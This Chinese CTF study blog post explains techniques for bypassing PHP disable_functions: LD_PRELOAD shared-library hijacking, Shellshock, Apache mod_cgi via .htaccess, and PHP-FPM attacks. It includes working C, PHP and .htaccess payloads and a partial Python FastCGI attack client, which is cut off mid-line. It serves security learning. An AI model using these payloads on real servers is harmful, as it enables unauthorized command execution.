<!DOCTYPE html>
<html>

	<head>
		
<title>关于disabled_function的绕过-Quiet</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico">


<meta name="keywords" content="web,">
<meta name="description" content="">


<script src="/js/jquery.min.js"></script>


	<meta name="generator" content="Hexo 5.4.0"></head>

	<body>
		
<link rel="stylesheet" href="/css/page.css">


<link rel="stylesheet" href="/css/page_cente.css">


<link rel="stylesheet" href="/css/atom-one-dark.css">


<link rel="stylesheet" href="/css/header.css">

	<div class="header">
		<div class="header-top">
			<div class="h-left">
				<a href="/">
					<img src="/image/logo.png" alt="Quiet">
				</a>
			</div>
			<div class="h-right">
				<ul>
					
						
								<li>
									<a href="/">
										HOME
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/archives">
										ARCHIVE
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/categories">
										CATEGORIES
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/tags">
										TAGS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/links">
										LINKS
									</a>
									<span class="dot"></span>
								</li>
								
									
						
								<li>
									<a href="/about">
										ABOUT
									</a>
									<span class="dot"></span>
								</li>
								
									
				</ul>
			</div>
			<div class="h-right-close">
				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
					<path fill="none" d="M0 0h24v24H0z" />
					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
				</svg>
			</div>
		</div>
	</div>
	<div class="sidebar">
    <div class="topo">
        <h2>KKfine</h2>
    </div>
    <ul>
        
        <li>
            <a href="/">HOME</a>
        </li>
        
        <li>
            <a href="/archives">ARCHIVE</a>
        </li>
        
        <li>
            <a href="/categories">CATEGORIES</a>
        </li>
        
        <li>
            <a href="/tags">TAGS</a>
        </li>
        
        <li>
            <a href="/links">LINKS</a>
        </li>
        
        <li>
            <a href="/about">ABOUT</a>
        </li>
        
    </ul>
    <div class="my_foot">
        
        <a target="_blank" rel="noopener" href="https://github.com/qiaobug">
            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
        </a>
        
    </div>
</div>
<div class='shelter'
    style='cursor: pointer;display: none; position: fixed;left: 0;top: 0; right: 0;bottom: 0;background-color: #fffff0;opacity:0.5;z-index: 108;'>
</div>
<style>
    .sidebar {
        width: 0;
        height: 100%;
        position: fixed;
        top: 0;
        right: 0;
        bottom: 0;
        background: #fff;
        z-index: 999;
        text-align: center;
        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
    }

    .topo {
        width: 100%;
        height: 200px;
        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
        background-size: 100% 100%;
        position: relative;
        display: flex;
        align-items: flex-end
    }

    .topo h2 {
        color: #fff;
        z-index: 1;
        position: relative;
        margin: 0 0 10px 10px;
        font-size: 1.2em;
        box-sizing: border-box
    }

    .topo:before {
        content: '';
        background-image: url(/image/pattern.png);
        background-repeat: repeat;
        height: 100%;
        left: 0;
        position: absolute;
        top: 0;
        width: 100%;
        z-index: 1
    }

    .sidebar ul {
        width: 100%;
        margin-top: 50px
    }

    .sidebar ul li {
        height: 50px;
        list-style: none;
        font-size: 1.2em;
        text-align: right;
        margin-right: 10px
    }

    .sidebar ul li a {
        display: grid;
        color: #5d606a;
        text-overflow: ellipsis;
        width: 100%;
        text-decoration: none
    }

    .my_foot {
        width: 100%;
        padding: 10px;
        margin-bottom: 10px;
        position: absolute;
        bottom: 0
    }

    .my_foot a {
        text-decoration: none;
        margin-right: 10px;
        display: inline-block
    }

    .my_foot a img {
        width: 30px;
        height: 30px
    }
</style>

<script>
    $(function () { $('.h-right-close>svg').click(function () { $('.sidebar').animate({ width: "66%" }, 500); $('.shelter').fadeIn("slow") }); $('.shelter').click(function (e) { $('.sidebar').animate({ width: "0" }, 500); $('.shelter').fadeOut("slow") }) })
</script>
		<script>
			$(function () { $(window).scroll(function () { if ($(document).scrollTop() > 100) { $(".header-top").removeClass("header-move2"); $('.header-top').addClass('header-move1') } else { $(".header-top").removeClass("header-move1"); $('.header-top').addClass('header-move2') } }) });
		</script>
<div class="header-bg bg-content-img">
    <div class="bg-content">
        <ul class="tag">
            
            
            <li><a href="/tags/web">web</a></li>
            
            
        </ul>
        <h1>关于disabled_function的绕过</h1>
        <div class="article-info">
            <div class="article-author">
                
                <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
                    xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
                    <path
                        d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
                        p-id="2902" fill="#ffffff"></path>
                </svg>
                
                <span> <a href="">KKfine</a></span>
                <p>2021-05-17 22:06:30</p>
            </div>
        </div>
    </div>
</div>
<div class="article-content">
    <div id="article" class="content">
        <p>最近做题遇到关于disabled_function的绕过，有时间来总结一下，博客顺序大致是按照ctfhub上的web进阶中关于disabled_fuction模块的学习顺序。</p>
<h3 id="绕过方式分类-大部分都可以用蚁剑插件直接进行，这里主要讲讲原理"><a href="#绕过方式分类-大部分都可以用蚁剑插件直接进行，这里主要讲讲原理" class="headerlink" title="绕过方式分类(大部分都可以用蚁剑插件直接进行，这里主要讲讲原理)"></a>绕过方式分类(大部分都可以用蚁剑插件直接进行，这里主要讲讲原理)</h3><h5 id="LD-PRELOAD利用-so文件环境变量加载指定的动态链接库，从而达到命令执行的目的"><a href="#LD-PRELOAD利用-so文件环境变量加载指定的动态链接库，从而达到命令执行的目的" class="headerlink" title="- LD_PRELOAD利用.so文件环境变量加载指定的动态链接库，从而达到命令执行的目的"></a>- LD_PRELOAD利用.so文件环境变量加载指定的动态链接库，从而达到命令执行的目的</h5><h5 id="CVE-2014-6271-Shellshock漏洞-bypass-disable-functions"><a href="#CVE-2014-6271-Shellshock漏洞-bypass-disable-functions" class="headerlink" title="- CVE-2014-6271 Shellshock漏洞 bypass disable_functions"></a>- CVE-2014-6271 Shellshock漏洞 bypass disable_functions</h5><h5 id="Apache-Mod-CGI"><a href="#Apache-Mod-CGI" class="headerlink" title="- Apache Mod CGI"></a>- Apache Mod CGI</h5><h5 id="攻击PHP-FPM绕过disable-funciton"><a href="#攻击PHP-FPM绕过disable-funciton" class="headerlink" title="- 攻击PHP_FPM绕过disable funciton"></a>- 攻击PHP_FPM绕过disable funciton</h5><h5 id="寻找未禁用的漏网函数，常见的执行命令的函数有-system-、exec-、shell-exec-、passthru-，偏僻的-popen-、proc-open-、pcntl-exec"><a href="#寻找未禁用的漏网函数，常见的执行命令的函数有-system-、exec-、shell-exec-、passthru-，偏僻的-popen-、proc-open-、pcntl-exec" class="headerlink" title="- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()"></a>- 寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()</h5><h5 id="UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等"><a href="#UAF-释放重引用漏洞，例GC-UAF、Json-Serializer-UAF-漏洞、Backtrace-UAF等" class="headerlink" title="- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等"></a>- UAF 释放重引用漏洞，例GC UAF、Json Serializer UAF 漏洞、Backtrace UAF等</h5><h5 id="COM组件-条件：Windows、php5-x、支持COM组件"><a href="#COM组件-条件：Windows、php5-x、支持COM组件" class="headerlink" title="- COM组件 条件：Windows、php5.x、支持COM组件"></a>- COM组件 条件：Windows、php5.x、支持COM组件</h5><h5 id="FFI扩展"><a href="#FFI扩展" class="headerlink" title="- FFI扩展"></a>- FFI扩展</h5><h5 id="iconv绕过"><a href="#iconv绕过" class="headerlink" title="- iconv绕过"></a>- iconv绕过</h5><h2 id="关于LD-PRELOAD"><a href="#关于LD-PRELOAD" class="headerlink" title="关于LD_PRELOAD"></a>关于LD_PRELOAD</h2><p>在学习LD_PRELOAD之前需要了解什么是链接。</p>
<p>程序的链接主要有以下三种：</p>
<p>静态链接：在程序运行之前先将各个目标模块以及所需要的库函数链接成一个完整的可执行程序，之后不再拆开。<br>装入时动态链接：源程序编译后所得到的一组目标模块，在装入内存时，边装入边链接。</p>
<p>运行时动态链接：原程序编译后得到的目标模块，在程序执行过程中需要用到时才对它进行链接。</p>
<p>对于动态链接来说，需要一个动态链接库，其作用在于当动态库中的函数发生变化对于可执行程序来说时透明的，可执行程序无需重新编译，方便程序的发布/维护/更新。但是由于程序是在运行时动态加载，这就存在一个问题，假如程序动态加载的函数是恶意的，就有可能导致disable_function被绕过。</p>
<h4 id="LD-PRELOAD的介绍"><a href="#LD-PRELOAD的介绍" class="headerlink" title="LD_PRELOAD的介绍"></a>LD_PRELOAD的介绍</h4><blockquote>
<h6 id="在UNIX的动态链接库的世界中，LD-PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime-linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。"><a href="#在UNIX的动态链接库的世界中，LD-PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime-linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。" class="headerlink" title="在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。"></a>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入恶意程序，从而达到那不可告人的罪恶的目的。</h6></blockquote>
<h4 id="对LD-PRELOAD的利用"><a href="#对LD-PRELOAD的利用" class="headerlink" title="对LD_PRELOAD的利用"></a>对LD_PRELOAD的利用</h4><blockquote>
<h6 id="前提：-能够上传-so文件到服务器后台，能够用putenv-等函数控制相应的环境变量，存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载LD-PRELOAD中的-so文件），比如mail-、imap-mail-、mb-send-mail-和error-log-等。"><a href="#前提：-能够上传-so文件到服务器后台，能够用putenv-等函数控制相应的环境变量，存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载LD-PRELOAD中的-so文件），比如mail-、imap-mail-、mb-send-mail-和error-log-等。" class="headerlink" title="前提： 能够上传.so文件到服务器后台，能够用putenv()等函数控制相应的环境变量，存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载LD_PRELOAD中的.so文件），比如mail()、imap_mail()、mb_send_mail()和error_log()等。"></a>前提： 能够上传.so文件到服务器后台，能够用putenv()等函数控制相应的环境变量，存在可以控制PHP启动外部程序的函数并能执行（因为新进程启动将加载LD_PRELOAD中的.so文件），比如mail()、imap_mail()、mb_send_mail()和error_log()等。</h6><p>首先，我们能够上传恶意.so文件，.so文件由攻击者在本地使用与服务端相近的系统环境进行编译，该库中重写了相关系统函数，重写的系统函数能够被PHP中未被disable_functions禁止的函数所调用。</p>
</blockquote>
<p>当我们能够设置环境变量，比如putenv函数未被禁止，我们就可以把LD_PRELOAD变量设置为恶意.so文件的路径，只要启动新的进程就会在新进程运行前优先加载该恶意.so文件，由此，恶意代码就被注入到程序中</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>system(<span class="hljs-string">&quot;touch /var/www/html/success&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">seteuid</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>) == <span class="hljs-literal">NULL</span>) &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br>payload();<br>&#125;<br></code></pre></td></tr></table></figure>
<p>如果想创建一个动态链接库，可以使用 GCC 的-shared选项。输入文件可以是源文件、汇编文件或者目标文件。另外还得结合-fPIC选项。-fPIC 选项作用于编译阶段，告诉编译器产生与位置无关代码（Position-Independent Code）；这样一来，产生的代码中就没有绝对地址了，全部使用相对地址，所以代码可以被加载器加载到内存的任意位置，都可以正确的执行。这正是共享库所要求的，共享库被加载时，在内存的位置不是固定的。你要根据目标架构编译成不同版本，在 x64 的环境中编译，若不带编译选项则默认为 x64，若要编译成 x86 架构需要加上 -m32 选项。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata">gcc -shared -fPIC <span class="hljs-keyword">test</span>.c -o test_x64.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure>
<p>使用该命令将.c文件编译成动态链接库.文件，并上传到/tmp上。</p>
<p>其实这里也有其他很多种代码，这里有一个通用化的代码。回到 LD_PRELOAD 本身，系统通过它预先加载共享对象，如果能找到一个方式，在加载时就执行代码，而不用考虑劫持某一系统函数，比如geteuid（）。</p>
<p>在GCC 有个 C 语言扩展修饰符__attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行__attribute__((constructor))修饰的函数。</p>
<p><strong>attribute</strong>((destructor))中的destructor参数让系统在main()函数退出或者调用了exit()之后,(被__attribute__((destructor))修饰的函数)</p>
<p>因此，只要php中设置了LD_PRELOAD，并派生了新的进程，将会执行LD_PRELOAD的文件中<br><strong>attribute</strong>((constructor))里的函数</p>
<p>test3.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br>__attribute__((constructor))<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">payload</span><span class="hljs-params">()</span> </span>&#123;<br>unsetenv(<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* cmd = getenv(<span class="hljs-string">&quot;CMD&quot;</span>);<br>system(cmd);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>test2.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;CMD=ls&quot;</span>);<br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=./test3_x64.so&quot;</span>);<br>error_log(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>putenv(<span class="hljs-string">&quot;LD_PRELOAD=/var/www/html/test_x64.so&quot;</span>);<br>mail(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>error_log(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-number">1</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>将php代码上传到/var/www/html/1.php，接着访问1.php，查看/var/www/html会新建一个success文件。由此即可达到绕过disable_function<br>参考文章<br><a href="_url"></a><a target="_blank" rel="noopener" href="http://www.52bug.cn/hkjs/6888.html">http://www.52bug.cn/hkjs/6888.html</a></p>
<h2 id="CVE-2014-6271-Shellshock漏洞-bypass-disable-functions（bash版本小于4-1）"><a href="#CVE-2014-6271-Shellshock漏洞-bypass-disable-functions（bash版本小于4-1）" class="headerlink" title="CVE-2014-6271 Shellshock漏洞 bypass disable_functions（bash版本小于4.1）"></a>CVE-2014-6271 Shellshock漏洞 bypass disable_functions（bash版本小于4.1）</h2><h4 id="介绍Shellshock漏洞"><a href="#介绍Shellshock漏洞" class="headerlink" title="介绍Shellshock漏洞"></a>介绍Shellshock漏洞</h4><blockquote>
<p>什么是SHELLSHOCK漏洞<br>Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。<br>在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。<br>简单来说就是由于服务器的cgi脚本调用了bash命令，由于bash版本过低，攻击者把有害数据写入环境变量，传到服务器端，触发服务器运行Bash脚本，完成攻击。</p>
</blockquote>
<h4 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h4><p>我们先来看一下这个漏洞形成的原因。这个问题的发生是因为Bash的一个功能，它允许在Bash的shell中使用环境变量来定义函数。<br>函数的作用是把经常调用的代码封装起来，然后在其他地方调用，所有的大多数脚本语言都有这个功能。<br>Bash中函数的定义是这样的:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">function ShellShock&#123;<br>   echo hello<br>&#125;<br>hello   #调用这个函数<br></code></pre></td></tr></table></figure>
<p>但是，Bash还有一种使用环境变量来定义函数的方法，这是它的特性。</p>
<p>如果环境变量的值以字符”() {“开头，那么这个变量就会被当作是一个导入函数的定义（Export），这种定义只有在shell启动的时候才生效.</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">➜  ~ export ShellShock=&quot;() &#123; echo Hello ShellShock; &#125;&quot;<br>➜  ~ ShellShock<br>bash:ShellShock: command not found<br>➜  ~ bash<br>bash-4.1$ ShellShock<br>Hello ShellShock<br>bash-4.1$ <br></code></pre></td></tr></table></figure>
<p>基于此可以构造很多命令，可参考这两篇文章<br><a href="_url">_link</a><a target="_blank" rel="noopener" href="https://www.freesion.com/article/28721177955/">https://www.freesion.com/article/28721177955/</a><br><a href="_url">_link</a><a target="_blank" rel="noopener" href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></p>
<h2 id="Apache-Mod-CGI绕过disable-function"><a href="#Apache-Mod-CGI绕过disable-function" class="headerlink" title="Apache Mod CGI绕过disable function"></a>Apache Mod CGI绕过disable function</h2><blockquote>
<p>利用条件：启用mod-cgi，允许htaccess文件，.htaccess可写</p>
</blockquote>
<h4 id="绕过原理"><a href="#绕过原理" class="headerlink" title="绕过原理"></a>绕过原理</h4><p>apache有一个cgi模块，该模块可以设置指定文件类型以cgi方式让服务器运行，例如一个不存在的afaafa后缀文件，通过设置，就可以当作cgi运行，因为是直接服务器运行的，所以可以绕过php的disable_functions限制。</p>
<p>任何具有MIME类型application/x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.</p>
<p>apache在配置cgi后可以用ScriptAlias指令指定一个目录,指定的目录下面便存放可执行的cgi程序.若是想要增加文件夹也可执行cgi程序,则可在apache主配置文件中做如下设置</p>
<p>先创建一个.a文件</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">#!/bin/shecho&amp;id<br></code></pre></td></tr></table></figure>
<p>然后再建一个.htaccess文件，内容如下，意思是把.a文件当作cgi执行。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">OPtions + ExecCGI<br>AddHandler cgi-script .nbcgi-script .a<br></code></pre></td></tr></table></figure>
<h2 id="攻击PHP-FPM绕过disable-function"><a href="#攻击PHP-FPM绕过disable-function" class="headerlink" title="攻击PHP_FPM绕过disable function"></a>攻击PHP_FPM绕过disable function</h2><h4 id="PHP-FPM介绍"><a href="#PHP-FPM介绍" class="headerlink" title="PHP_FPM介绍"></a>PHP_FPM介绍</h4><p>Php-fpm是什么</p>
<blockquote>
<p>1、cgi、fast-cgi协议<br>cgi的历史<br>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序</p>
</blockquote>
<p>fast-cgi的改进</p>
<blockquote>
<p>有了cgi协议，解决了php解释器与webserver通信的问题，webserver终于可以处理动态语言了。但是，webserver每收到一个请求，都会去fork一个cgi进程，请求结束再kill掉这个进程。这样有10000个请求，就需要fork、kill php-cgi进程10000次。</p>
</blockquote>
<p>于是，出现了cgi的改良版本</p>
<blockquote>
<p>fast-cgi。fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p>
</blockquote>
<p>所以</p>
<blockquote>
<p>php-fpm即php-Fastcgi Process Manager.php-fpm是 FastCGI 的实现，并提供了进程管理的功能。进程包含 master 进程和 worker 进程两种进程。master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p>
</blockquote>
<p>工作流程如图<br><img src="https://img-blog.csdnimg.cn/20210518122607155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="攻击PHP-FPM的原理"><a href="#攻击PHP-FPM的原理" class="headerlink" title="攻击PHP-FPM的原理"></a>攻击PHP-FPM的原理</h4><p>基本原理就是模仿nginx的fast-cgi，直接与php-fpm进行通信。<br><img src="https://img-blog.csdnimg.cn/20210518123521695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<ul>
<li>requestId:占俩个字节，一个唯一的标志id，以避免同时处理多个请求时的影响。 </li>
<li>contentLength:占2个字节，表示body的长度。语言端解析了fastcgi头以后，拿到contentLength，然后再在TCP流里读取大小等于contentLength的数据，这就是body体。 </li>
<li>paddingLength:填充长度的值，为了提高处理消息的能力，我们的每个消息大小都必须为8的倍数，此长度标示，我们在消息的尾部填充的长度 </li>
<li>reserved:保留字段</li>
</ul>
<p>贴一下大佬得脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FastCGIClient</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># 版本号，不重要</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    <span class="hljs-comment"># FastCGI服务器角色及其设置</span><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    <span class="hljs-comment"># # type 记录类型1-11</span><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    <span class="hljs-comment"># 头部长度，默认为8</span><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># 自定义请求状态</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):</span><br>        self.host = host<br>        self.port = port<br>        self.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            self.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            self.keepalive = <span class="hljs-number">0</span><br>        self.sock = <span class="hljs-literal">None</span><br>        self.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__connect</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 此函数创建了一个socket，并且去连接(self.host, self.port)</span><br>        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        self.sock.settimeout(self.timeout)<br>        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">try</span>:<br>            self.sock.connect((self.host, <span class="hljs-built_in">int</span>(self.port)))<br>        <span class="hljs-keyword">except</span> socket.error <span class="hljs-keyword">as</span> msg:<br>            self.sock.close()<br>            self.sock = <span class="hljs-literal">None</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">repr</span>(msg))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):</span><br>        <span class="hljs-comment"># 此函数根据fcgi_type对content进行封装</span><br>        length = <span class="hljs-built_in">len</span>(content)<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">chr</span>(FastCGIClient.__FCGI_VERSION) \<br>               + <span class="hljs-built_in">chr</span>(fcgi_type) \<br>               + <span class="hljs-built_in">chr</span>((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>               + <span class="hljs-built_in">chr</span>(requestid &amp; <span 